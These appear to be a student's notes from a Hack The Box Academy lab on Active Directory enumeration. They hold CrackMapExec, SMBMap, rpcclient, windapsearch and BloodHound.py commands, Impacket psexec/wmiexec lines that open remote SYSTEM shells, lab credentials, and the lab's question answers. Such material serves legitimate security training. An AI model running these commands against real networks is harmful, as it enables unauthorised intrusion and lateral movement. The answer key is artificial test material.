
##### CrackMapExec SMB Enumeration
```go
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

##### CME (CrackMapExec) -  Domain Group Enumeration
```go
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

##### CME - Logged on Users
```go
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

##### CME Share Searching

>[!info]
> Use the `--shares` flag to enumerate available shares on the remote host and the level of access our user account has to each share

```go
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```


##### Spider_plus

>[!info]
> - The module `spider_plus` will dig through each readable share on the host and list all readable files.
> - The results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`

```go
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```


-------------------------------------
### SMBMap

##### SMBMap to Check Access
```go
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

##### Recursive List of All Directories
```go
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

##### rpcclient SMB NULL Session
```go
rpcclient -U "" -N 172.16.5.5
```

>[!Tip] Quick Note on RIDs
>- A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects
>- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
>- So the domain user `htb-student` with a RID:0x457 Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
>- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.
>- Accounts like the built-in Administrator for a domain will have a RID administrator rid:0x1f4, which, when converted to a decimal value, equals `500`

##### RPCClient User Enumeration By RID
```go
queryuser 0x457
```


----------------------------------------------------

### Impacket Toolkit

##### Psexec.py
>[!info]
> It creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.
> ```go 
>psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
>```


##### wmiexec.py
>[!info]
> Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with
> ```go
> wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
> ```



### Windapsearch
>[!info] 
> A Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries.


##### Windapsearch - Domain Admins
```go
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```


##### Windapsearch - Privileged Users
```go
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```


### Bloodhound.py

>[!info]
> The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files.
> It collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.

##### Executing BloodHound.py
```go
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

##### Upload Zip file into BloodHound GUI

Start neo4j server
```go
sudo neo4j start
```

```go
zip -r name_of_zip.zip *.json
```

Use the 'Upload' button to upload the zip file

### Resource for Custom Queries

- [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

### WADComs
- https://wadcoms.github.io/


# Questions

Username
```go
htb-student
```

Password
```go
HTB_@cademy_stdnt!
```

IP
```go
10.129.37.108
```

SSH
```go
sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.37.108
```

1) What AD User has a RID equal to Decimal 1170?
```go
mmorgan
```

Use rpcclient to enumerate and then convert the decomal 1170 to HEX
```go
rpcclient -U "" -N 172.16.5.5
```

2) What is the membercount: of the "Interns" group?
```go
10
```

```go
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

